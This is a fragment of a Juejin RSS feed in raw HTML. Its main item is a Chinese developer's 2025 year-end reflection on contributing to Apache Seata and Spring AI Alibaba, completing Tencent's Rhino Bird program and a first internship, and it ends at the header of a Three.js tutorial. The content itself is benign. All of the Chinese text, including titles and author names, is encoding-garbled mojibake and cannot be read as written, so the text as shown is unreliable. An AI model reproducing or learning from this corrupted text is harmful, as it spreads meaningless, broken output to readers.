</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025å¹´æ€»ç»“ï¼šä¸€ä¸ªæ ‘è‹—å€”å¼ºç”Ÿé•¿]]></title>    <link>https://juejin.cn/post/7597704040216494106</link>    <guid>https://juejin.cn/post/7597704040216494106</guid>    <pubDate>2026-01-22T06:37:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597704040216494106" data-draft-id="7597758250825826314" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025å¹´æ€»ç»“ï¼šä¸€ä¸ªæ ‘è‹—å€”å¼ºç”Ÿé•¿"/> <meta itemprop="keywords" content="å¼€æº,GitHub,æ¶æ„"/> <meta itemprop="datePublished" content="2026-01-22T06:37:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æƒ³ç”¨offeræ‰“ç‰Œ"/> <meta itemprop="url" content="https://juejin.cn/user/578781641968972"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025å¹´æ€»ç»“ï¼šä¸€ä¸ªæ ‘è‹—å€”å¼ºç”Ÿé•¿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/578781641968972/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æƒ³ç”¨offeræ‰“ç‰Œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T06:37:57.000Z" title="Thu Jan 22 2026 06:37:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.8;font-weight:400;font-size:16px;word-spacing:2px;letter-spacing:2px;overflow-x:hidden;color:#3e3e3e;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{padding-bottom:12px;font-size:24px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:1.2em;border-bottom:2px solid #ef7060;word-spacing:0!important;letter-spacing:0!important;font-size:inherit;line-height:inherit;display:block;font-weight:400;background:#ef7060;color:#fff;padding:10px;border-top-right-radius:3px;border-top-left-radius:3px;margin-right:3px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>ä»Šå¹´è¿‡çš„çœŸæ˜¯å¿«ï¼Œä¸€è½¬çœ¼ï¼Œå°±ä»2025å¹´åˆ°2026å¹´äº†ã€‚å°æ—¶å€™æ€»ä»¥ä¸ºè¦åˆ°2025å¾ˆé¥è¿œå¾ˆé¥è¿œï¼Œè®°å¾—å°å­¦è¿˜å†™è¿‡ä¸€ç¯‡ä½œæ–‡ï¼Œå¹»æƒ³åˆ°äº†2025å¹´ï¼Œæˆ‘ä»¬ç”Ÿæ´»ä¼šæ˜¯æ€ä¹ˆæ ·çš„ã€‚</p>
<p>æˆ‘é‚£æ—¶å€™æƒ³ï¼Œæˆ‘ä»¬ä»¥åçš„äº¤é€šå·¥å…·éƒ½æ˜¯ä¹˜åä¼šé£çš„æ±½è½¦ï¼Œæœ‰ç‚¹åƒè‹ä¿„é‚£æ—¶å€™çš„å®£ä¼ ä¸€æ ·ï¼Œäººä»¬ä¹Ÿä¸ç”¨è¾›å‹¤åŠ³åŠ¨ï¼Œä¼šæœ‰æœºå™¨äººæ¥ä¸“é—¨æœåŠ¡æˆ‘ä»¬ç­‰ç­‰ã€‚æˆ‘è¿˜æƒ³åˆ°ï¼Œæˆ‘ä»¥åè‚¯å®šè¦æˆä¸ºä¸€ä¸ªç§‘å­¦å®¶æˆ–è€…è½¯ä»¶å·¥ç¨‹å¸ˆï¼Œè®©å…¨ä¸–ç•Œçš„äººä»¬éƒ½èƒ½ä½¿ç”¨æˆ‘å¼€å‘çš„ä¸œè¥¿(å“ˆå“ˆï¼Œä¸€ä¸ªå°å­©å­æ€»æ˜¯å¤©çœŸçš„ï¼Œçƒ‚æ¼«çš„)ã€‚</p>
<p>çœŸæ­£åˆ°äº†2026å¹´ï¼Œæˆ‘å‘ç°æœªæ¥çœŸçš„æ­£åœ¨åƒè¿™æ ·æ¼”å˜ï¼Œäºæ˜¯æˆ‘æƒ³å†™ä¸€ç¯‡è¿™æ ·çš„æ–‡ç« è®°å½•è‡ªå·±çš„æˆé•¿ï¼Œè®°å½•è‡ªå·±çš„2025ã€‚ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡å†™è¿™ç§ç±»ä¼¼å¹´ç»ˆæ€»ç»“çš„æ–‡ç« ï¼Œå¤§å®¶éšæ„çœ‹çœ‹å°±å¥½äº†ï¼Œå¦‚æœæœ‰å†™çš„ä¸å¥½çš„åœ°æ–¹ï¼Œè¯·è§è°…ã€‚</p>
<h2 data-id="heading-1">å«©èŠ½æœŸ</h2>
<p>å¹´åˆçš„æ—¶å€™ï¼Œæˆ‘è¿˜æ˜¯ä¸€ä¸ªæŠ€æœ¯æ¯”è¾ƒä¸€èˆ¬çš„åç«¯å¼€å‘äººå‘˜ï¼Œä¹Ÿä¸å»ä¸Šè¯¾ï¼Œä¸€å¿ƒåœ¨é’»ç ”è‡ªå·±çš„ä¸œè¥¿ï¼Œä»è¯­è¨€åº•å±‚åˆ°æŠ€æœ¯æ¶æ„ï¼Œå‡ ä¹ä»€ä¹ˆéƒ½å­¦å§ï¼Œä½†æ˜¯éƒ½æ˜¯å¤ªå®½æ³›äº†ï¼Œå¯¹æŸä¸ªæŠ€æœ¯æ ˆä¹Ÿæ²¡æœ‰å¾ˆæ·±å…¥çš„å»äº†è§£æºç å’Œæ¶æ„ã€‚</p>
<p>è¿™ä¸€æ—¶æœŸæ˜¯æå…¶<strong>æ¯ç‡¥ä¹å‘³</strong>çš„ï¼Œå’Œä¼—å¤šåˆå­¦è€…ä¸€æ ·ï¼Œæ€»è®¤ä¸ºåˆ«äººæå‡ºçš„æ–¹æ¡ˆå°±æ˜¯å¾ˆå¥½çš„äº†ï¼Œæ²¡æœ‰è‡ªå·±çš„æ€è€ƒã€‚ä¸ºä»€ä¹ˆè¿™ä¸ªæ–¹æ¡ˆå°±æ˜¯æœ€å¥½çš„ï¼Œå®ƒçš„ä¼˜åŠ¿æ˜¯ä»€ä¹ˆï¼Œè¿˜å¯ä¸å¯èƒ½æœ‰æ›´å¥½çš„æ–¹æ¡ˆå¯ä»¥è§£å†³ï¼Œå…œåº•æ€ä¹ˆå¤„ç†ç­‰ç­‰ã€‚</p>
<p>æ€»è·Ÿç€åˆ«äººèµ°ï¼Œä½†æ˜¯æˆ‘è§‰å¾—è¿™ç§æ˜¯ä¸€ä¸ªæŠ€æœ¯äººå‘˜æˆé•¿çš„å¿…ç»ä¹‹è·¯å§ï¼Œæ²¡æœ‰ä»€ä¹ˆå¥½ç¾è€»çš„ï¼Œä»è¿½éšè€…ï¼Œåˆ°å¼•é¢†è€…ï¼Œæ€»æ˜¯éœ€è¦ä¸€ä¸ªè¿‡ç¨‹ã€‚</p>
<p>å­¤ç‹¬å—ï¼Ÿå½“ç„¶å¾ˆ<strong>å­¤ç‹¬</strong>ï¼Œè¿™ä¸ªæ—¶æœŸçš„æˆ‘ï¼Œæ²¡æœ‰æ„Ÿåˆ°ä»»ä½•æ­£åé¦ˆï¼Œå½“ç„¶ä¼šæ„Ÿåˆ°å¾ˆç…ç†¬ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“èµ°è¿™æ¡è·¯æ˜¯å¦æ˜¯æ­£ç¡®çš„ã€‚ç°åœ¨ç«äº‰è¿™ä¹ˆæ¿€çƒˆï¼Œå¤–ç•ŒåŒæ—¶ä¹Ÿåœ¨ä¸æ–­å”±è¡°è¿™ä¸€è¡Œä¸šï¼Œè¯´æ²¡æœ‰å‹åŠ›ï¼Œè‚¯å®šæ˜¯å‡çš„ã€‚</p>
<p><strong>æˆ‘æ„Ÿå¹å¹¸äºæœ‰AIçš„å‡ºç°ã€‚</strong></p>
<p>åœ¨ä¸€ä¸ªäººå­¦ä¹ çš„æ—¶å€™ï¼ŒæŸ¥ç½‘ä¸Šçš„èµ„æ–™ä¸ä¸€å®šèƒ½æ‰¾åˆ°å¿ƒä»ªçš„ï¼Œå°±ä¼šå»é—®aiï¼Œæ¯”å¦‚Geminiï¼ŒGPTï¼ŒGrokç­‰ç­‰ï¼Œè¿˜æœ‰å›½äº§çš„Qwenéƒ½ä¸é”™ã€‚è™½ç„¶AIæ—¶ä¸æ—¶å°±ä¼šå‡ºç°å¹»è§‰ï¼Œç”šè‡³å›ç­”çš„æ˜¯é”™è¯¯çš„ï¼Œä½†æ˜¯æ­£æ˜¯å› ä¸ºå®ƒä»¬å›ç­”ä¸ä¸€å®šæ˜¯æ­£ç¡®çš„ï¼Œæˆ‘æ‰å…»æˆäº†è´¨ç–‘ä¸è‡ªæˆ‘æ¢ç´¢çš„ç²¾ç¥ï¼Œæˆ‘ä¼šå»å¯¹åº”çš„æºç æŸ¥æ‰¾åˆ°åº•æ˜¯ä¸æ˜¯è¿™æ ·çš„ï¼Œä»æ¶æ„ä¸Šç†è§£è¿™æ ·åšçš„åŸå› åˆ°åº•æ˜¯ä¸ºä»€ä¹ˆç­‰ç­‰ã€‚</p>
<p><strong>æˆ‘è§‰å¾—æ­£æ˜¯è¿™æ ·çš„å†³å¿ƒä¸å“è´¨ï¼Œæ‰æ˜¯ä¿ƒè¿›æˆ‘å‘ç”Ÿæ ¹æœ¬è¿›æ­¥çš„åŸå› å§</strong></p>
<h2 data-id="heading-2">æˆé•¿æœŸ</h2>
<p>éšç€æŠ€æœ¯å’Œæ¶æ„ç†è§£ä¸æ–­æ·±å…¥ï¼Œæˆ‘å¯¹ä¸€äº›ä¸­é—´ä»¶éå¸¸æ„Ÿå…´è¶£ï¼Œå¼€å§‹æ·±å…¥çš„ç ”ç©¶æºç ã€‚</p>
<h3 data-id="heading-3">åœ¨Apache seataç¤¾åŒº</h3>
<p>æ€€æ£ç€å¯¹åˆ†å¸ƒå¼äº‹åŠ¡çš„æå¤§å…´è¶£ï¼Œæˆ‘åœ¨å››æœˆä»½forkäº†seataçš„æºç ä¸‹æ¥ç ”ç©¶ã€‚èµ·åˆç»“åˆç€å®˜æ–¹æ–‡æ¡£çœ‹ä¹Ÿæœ‰ç‚¹åƒåŠ›ï¼Œåˆ°åé¢å‹åŠ›æ…¢æ…¢æ‰é€æ¸å‡å°‘ã€‚ç¤¾åŒºå‘å¸ƒäº†å¥½å‡ ä¸ªissueï¼Œå…¶ä¸­åŒ…æ‹¬äº†å¯¹å•æµ‹è¦†ç›–ç‡çš„éœ€æ±‚ã€‚æˆ‘å°è¯•åšäº†å¥½å‡ ä¸ªï¼Œä»¥ä¾¿æˆ‘å¯ä»¥å¯¹æŸä¸ªæ¨¡å—æ·±å…¥äº†è§£ã€‚</p>
<p>å…¶å®ç›´åˆ°ç°åœ¨æˆ‘éƒ½è§‰å¾—ï¼Œçœ‹æˆ–è€…åšUTéƒ½æ˜¯æ·±å…¥äº†è§£ä¸€ä¸ªé¡¹ç›®æˆ–è€…æ¨¡å—çš„å¥½æ–¹æ³•ï¼Œå•æµ‹æä¾›äº†è¿™ä¸ªåŠŸèƒ½æ€ä¹ˆç”¨ï¼Œæ€ä¹ˆèµ°çš„æµç¨‹çš„ç¤ºèŒƒã€‚</p>
<p>åœ¨é™†ç»­åšäº†å‡ ä¸ªUTï¼Œå°±æäº†PRï¼Œç»è¿‡äº†reviewerä»¬çš„crä¸æç¤ºï¼Œæˆ‘ä¹Ÿäº†è§£äº†å¾ˆå¤šè§„èŒƒçŸ¥è¯†å’Œci/cdçš„é‡è¦æ€§ã€‚</p>
<p><strong>æˆ‘åœ¨seataç¤¾åŒºæˆé•¿ï¼Œå’Œseataä¸€èµ·æˆé•¿ã€‚</strong></p>
<p>ä¼´éšç€å¯¹é¡¹ç›®çš„ä¸æ–­æ·±å…¥çš„äº†è§£ï¼Œæˆ‘å¼€å§‹èƒ½æå‡ºOptimizeï¼Œbugfixçš„PRï¼Œåˆ°åé¢ç”šè‡³åšäº†å‡ ä¸ªfeatureçº§åˆ«çš„ï¼ŒåŒæ—¶ä¹Ÿæ”¶åˆ°äº†æ¥è‡ªå¥æ–Œå“¥å’Œæ¸…é“­å“¥çš„å¤§æ‹‡æŒ‡ï¼Œè¿™å¯¹æˆ‘æ˜¯éå¸¸å¤§çš„æ­£åé¦ˆã€‚æˆ‘äºæ˜¯åœ¨seataä¹Ÿæäº†ä¸å°‘prï¼Œå…¶ä¸­è¢«é‡‡çº³ä¸åœ¨å°‘æ•°ï¼Œåˆ°åæ¥ç”šè‡³èƒ½è‡ªå·±æissueï¼Œè‡ªå·±ç»™è‡ªå·±æprï¼Œä¹Ÿå¼€å§‹ç»™åˆ«äººreview PRã€‚</p>
<p>ä¼´éšç€seataä¸æ–­è¿­ä»£å‡ ä¸ªç‰ˆæœ¬ï¼Œæˆ‘ä¹Ÿé€æ¸èå…¥seataè¿™ä¸ªç¤¾åŒºå¤§å®¶åº­ï¼Œæˆä¸ºå…¶ä¸­ä¸€ä»½å­ã€‚åˆ°åæ¥ä¹Ÿéå¸¸è£å¹¸çš„æˆä¸ºäº†<strong>seataçš„committer</strong></p>
<p>ç›´åˆ°ç°åœ¨å³ä½¿éå¸¸å¿™ï¼Œæˆ‘ä¹Ÿä¸€ç›´åœ¨å…³æ³¨ç€seataçš„å‘å±•ã€‚</p>
<h3 data-id="heading-4">è…¾è®¯çŠ€ç‰›é¸Ÿ</h3>
<p>åœ¨å¼€æºç¤¾åŒºçš„æ—¥å­ï¼Œæˆ‘ä¹Ÿè®¡åˆ’ç€å‚åŠ ä¸€ä¸ªå¼€æºè®¡åˆ’ï¼Œäºæ˜¯é€‰ä¸­äº†è…¾è®¯çŠ€ç‰›é¸Ÿè®¡åˆ’ã€‚åœ¨æˆ‘å¯¹å¿ƒä»ªé¡¹ç›®æœ‰æ¯”è¾ƒæ·±å…¥çš„äº†è§£å’Œæäº¤äº†å‡ ä¸ªpråï¼Œå‘å¯¼å¸ˆæäº¤äº†ç›¸å…³çš„ä¼åˆ’ä¹¦ã€‚</p>
<p>å½“æ”¶åˆ°è¢«é¡¹ç›®é€‰ä¸­å‚åŠ çš„é‚®ä»¶æ—¶ï¼Œæˆ‘æ˜¯æ„Ÿåˆ°éå¸¸è£å¹¸å’Œå¼€å¿ƒçš„ï¼ŒåŒæ—¶ä¹Ÿæœ‰å‹åŠ›ï¼Œæ‹…å¿ƒè‡ªå·±è¾œè´Ÿå¯¼å¸ˆçš„æœŸæœ›ï¼Œæ— æ³•å®Œæˆä»»åŠ¡ã€‚</p>
<p>åœ¨å¯¼å¸ˆçš„æŒ‡å¯¼ä¸‹ï¼Œåœ¨ç»å†äº†å‡ ä¸ªæœˆåŠªåŠ›ï¼Œæœ€ç»ˆä¹Ÿæ˜¯æˆåŠŸç»“ä¸šäº†</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aed43332cc0e4015902d7459b3553369~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oOz55Sob2ZmZXLmiZPniYw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769668676&amp;x-signature=LIjptYbKzNXVj05eifgkj%2FT9pOM%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-5">åœ¨Spring AI Alibabaç¤¾åŒº</h3>
<p>å‡ ä¸ªæœˆå‰ï¼Œæˆ‘æ”¶åˆ°å®å®‡å“¥çš„ç§ä¿¡ï¼Œé‚€è¯·æˆ‘ä¸€èµ·æ¥ä¸ºSAAåšè´¡çŒ®ï¼Œæˆ‘æ„Ÿåˆ°éå¸¸è£å¹¸ä¸å¼€å¿ƒã€‚</p>
<p>å› ä¸ºå·²ç»æœ‰äº†å¯¹å¤§å‹é¡¹ç›®çš„è´¡çŒ®ç»éªŒï¼Œè¿™æ¬¡å¯¹SAAçš„æ•´ä½“æ¶æ„ç†è§£å¹¶ä¸ç®—å¤ªä¹…ï¼ŒåŒæ—¶å¯¹agentç­‰ç­‰çŸ¥è¯†ä¹Ÿæœ‰äº†æ–°çš„è®¤è¯†ã€‚æˆ‘å…ˆæ˜¯ä¸ºexampleè´¡çŒ®äº†prï¼Œåœ¨ä½¿ç”¨ä¸Šå¤§æ¦‚æœ‰äº†ä½“æ„Ÿã€‚ç„¶ååœ¨å‡ ä¸ªissueä¸Šç ”ç©¶äº†ä¸€æ®µæ—¶é—´ï¼Œä¹Ÿæ˜¯é€æ¸æäº†prå¹¶åˆå¹¶äº†ã€‚åœ¨è¿™é‡Œéå¸¸æ„Ÿè°¢å†›å“¥å’Œå®å®‡å“¥çš„crå’Œå»ºè®®ï¼Œå¯¹æˆ‘å¸®åŠ©éå¸¸å¤§ã€‚</p>
<p>æˆ‘åˆ°ç°åœ¨ä¹Ÿè¿˜åœ¨é€æ­¥æ·±å…¥SAAé¡¹ç›®ï¼Œå¸Œæœ›èƒ½ä¸ºSAAå‘å±•è´¡çŒ®è‡ªå·±çš„ä¸€ä»½åŠ›é‡ï¼Œä¸ºJavaå¼€å‘äººå‘˜æ›´å¥½çš„æ„å»ºAIæ™ºèƒ½ä½“å‡ºä¸€ä»½è‡ªå·±çš„åŠ›é‡</p>
<h2 data-id="heading-6">ç¬¬ä¸€ä»½å®ä¹ </h2>
<p>åœ¨å¹´ä¸­ï¼Œæˆ‘æ‰¾åˆ°äº†ç¬¬ä¸€ä»½å®ä¹ ï¼Œè™½ç„¶å…¬å¸è§„æ¨¡æ€»ä½“ä¸ç®—å¤§ï¼Œä½†å¥½åœ¨è¿˜ä¸é”™ã€‚</p>
<p>æˆ‘æ„Ÿè°¢hfå“¥ã€tzå“¥è¿˜æœ‰æ¬¢å“¥ï¼Œåœ¨æˆ‘landingæœŸå¯¹æˆ‘å¸®åŠ©éå¸¸å¤§ï¼Œå¹³å¸¸ä¹Ÿéå¸¸ç…§é¡¾æˆ‘ã€‚æˆ‘å¾ˆæ„Ÿè°¢ä»–ä»¬ã€‚</p>
<p>è™½ç„¶åœ¨å…¬å¸å¾…çš„æ—¶é—´ä¸ä¹…ï¼Œä½†æ˜¯æˆ‘æ”¶è·çš„çŸ¥è¯†å´å¾ˆå¤šï¼Œæˆ‘éå¸¸è£å¹¸èƒ½å¤Ÿæœ‰è¿™ä¸€æ¬¡ç»å†ã€‚</p>
<h2 data-id="heading-7">å¯¹æ–°çš„ä¸€å¹´æœ‰ä»€ä¹ˆå±•æœ›å—</h2>
<p>æˆ‘å¸Œæœ›èƒ½å¤Ÿä¸æ–­æé«˜è‡ªå·±çš„æŠ€æœ¯ï¼Œç»§ç»­ä¸ºseataç¤¾åŒºå’ŒSAAç¤¾åŒºè´¡çŒ®è‡ªå·±çš„ä¸€ä»½åŠ›é‡ï¼ŒåŒæ—¶ä¹Ÿç»§ç»­è¾“å‡ºä¼˜è´¨çš„åšå®¢ï¼Œè®©è¯»è€…å–œæ¬¢çœ‹ã€‚</p>
<p>å½“ç„¶å¦‚æœåœ¨æ–°çš„ä¸€å¹´ï¼Œèƒ½æ‰¾åˆ°å¿ƒä»ªçš„å®ä¹ ï¼Œå¹¶åœ¨ç§‹æ‹›æœ€ç»ˆæˆåŠŸè¿›å…¥å¿ƒä»ªçš„ä¼ä¸šï¼Œåˆ™æ˜¯å†å¥½ä¸è¿‡äº†â¤ï¸</p>
<h2 data-id="heading-8">åœ¨è¿‡å»çš„ä¸€å¹´æœ‰ä»€ä¹ˆåæ‚”çš„å—</h2>
<p>è€å®è¯´ï¼Œæˆ‘å¹¶æ²¡æœ‰ä»€ä¹ˆåæ‚”çš„ï¼Œå› ä¸ºæˆ‘è§‰å¾—æˆ‘å·²ç»å°½äº†æˆ‘çš„æœ€å¤§åŠªåŠ›ï¼Œæœç€æˆ‘è‡ªå·±çš„ç›®æ ‡å‰è¿›ã€‚</p>
<p>ä½†æ˜¯ç¡¬è¦è¯´ï¼Œæœ‰ä»€ä¹ˆå¯¹ä¸èµ·çš„äººæˆ–è€…äº‹çš„è¯ï¼Œæˆ‘æƒ³å¯¹è‡ªå·±è¯´å£°å¯¹ä¸èµ·ã€‚2025å¹´ä½ å¾ˆåŠªåŠ›äº†ï¼Œæ²¡æœ‰æ€ä¹ˆä¼‘æ¯ï¼Œä¹Ÿæ²¡æœ‰æ€ä¹ˆå»ç©ï¼Œä½†æ˜¯ä¾ç„¶ä¸æ–­å‰è¿›ï¼Œæƒ³è¦è¾¾æˆè‡ªå·±çš„ç›®æ ‡ï¼Œè°¢è°¢ä½ ã€‚</p>
<h2 data-id="heading-9">æ€»ç»“</h2>
<p>è¿™ç¯‡æ–‡ç« å¯èƒ½çœ‹ä¼¼èƒ¡è¯´å…«é“ï¼Œæ²¡æœ‰æ¡ç†(å¯èƒ½ä¹ŸçœŸæ˜¯è¿™æ ·)ï¼Œä½†æ˜¯ç¡®å®ä»£è¡¨äº†æˆ‘2025çš„å¿ƒè·¯å†ç¨‹ã€‚</p>
<p>å¸Œæœ›å¤§å®¶æ–°çš„ä¸€å¹´è¶Šè¿‡è¶Šå¥½ï¼Œèº«ä½“å¥åº·ï¼Œä¸‡äº‹å¦‚æ„â¤ï¸</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å­¦ä¹ Three.js--æ›²çº¿(Curve)]]></title>    <link>https://juejin.cn/post/7597722671084601378</link>    <guid>https://juejin.cn/post/7597722671084601378</guid>    <pubDate>2026-01-22T06:43:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597722671084601378" data-draft-id="7597779410406113314" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å­¦ä¹ Three.js--æ›²çº¿(Curve)"/> <meta itemprop="keywords" content="å‰ç«¯,three.js"/> <meta itemprop="datePublished" content="2026-01-22T06:43:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é€ è½®å­çš„çŒª"/> <meta itemprop="url" content="https://juejin.cn/user/497453720940158"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å­¦ä¹ Three.js--æ›²çº¿(Curve)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/497453720940158/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é€ è½®å­çš„çŒª
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T06:43:47.000Z" title="Thu Jan 22 2026 06:43:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
